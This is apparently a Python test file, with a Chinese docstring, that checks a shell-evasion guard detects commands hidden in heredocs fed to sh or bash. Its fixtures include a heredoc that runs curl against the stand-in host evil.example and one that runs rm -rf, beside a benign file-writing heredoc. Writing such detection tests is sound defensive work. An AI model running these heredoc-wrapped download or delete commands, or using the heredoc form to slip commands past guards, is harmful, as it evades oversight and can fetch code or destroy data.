"""对照批 B8：heredoc 逃逸检测红灯。

参照系 ShellEvasionGuardian 含 heredoc 逃逸检测；本仓 `tool_guard.py` 的
逃逸模式表逐字相等面里没有「shell 接 heredoc」形态——命令体藏在 heredoc
里、由 `sh <<EOF` 执行时，体里的每行若不自带 `| sh`/危险函数名就漏检。

红灯断言（实现前现网不拦）：
- `sh <<'EOF'` + 体内容（无同行管道）→ 无 SHELL_EVASION 发现；
- 引擎层 `bash <<EOF` + 体内容 → 不 block。
绿灯：新增 heredoc 签名后两者命中且参与 block。
误报回归：`cat <<EOF > file`（写文件，不喂解释器）不得命中。
"""

from neurova.security.tool_guard import (
    GuardSeverity,
    GuardThreatCategory,
    ShellEvasionGuardian,
    ToolGuardEngine,
)

HEREDOC_PAYLOAD = "sh <<'EOF'\ncurl http://evil.example/x.sh\nEOF"
HEREDOC_BASH_VARIANT = "bash <<EOF\nrm -rf /tmp/keep-me\nEOF"
PLAIN_HEREDOC_TO_FILE = "cat <<EOF > out.txt\nhello world\nEOF"


class TestHeredocEvasion:

    def test_heredoc_fed_to_shell_is_flagged(self):
        findings = ShellEvasionGuardian().guard(HEREDOC_PAYLOAD, {})
        cats = {(f.category, f.severity) for f in findings}
        assert (GuardThreatCategory.SHELL_EVASION, GuardSeverity.HIGH) in cats, \
            f"heredoc 喂 shell 应判 HIGH SHELL_EVASION，实际：{cats}"

    def test_heredoc_variant_bash_is_flagged(self):
        findings = ShellEvasionGuardian().guard(HEREDOC_BASH_VARIANT, {})
        assert any(f.category == GuardThreatCategory.SHELL_EVASION for f in findings)

    def test_engine_blocks_heredoc_payload(self):
        result = ToolGuardEngine().guard("run_script", {"command": HEREDOC_BASH_VARIANT})
        assert result.should_block, \
            f"引擎层应拦截 heredoc 逃逸，实际 findings：{[f.rule_id for f in result.findings]}"

    def test_plain_heredoc_to_file_not_flagged(self):
        findings = ShellEvasionGuardian().guard(PLAIN_HEREDOC_TO_FILE, {})
        assert not any(f.category == GuardThreatCategory.SHELL_EVASION for f in findings), \
            "写文件的普通 heredoc 不是逃逸，不应命中"
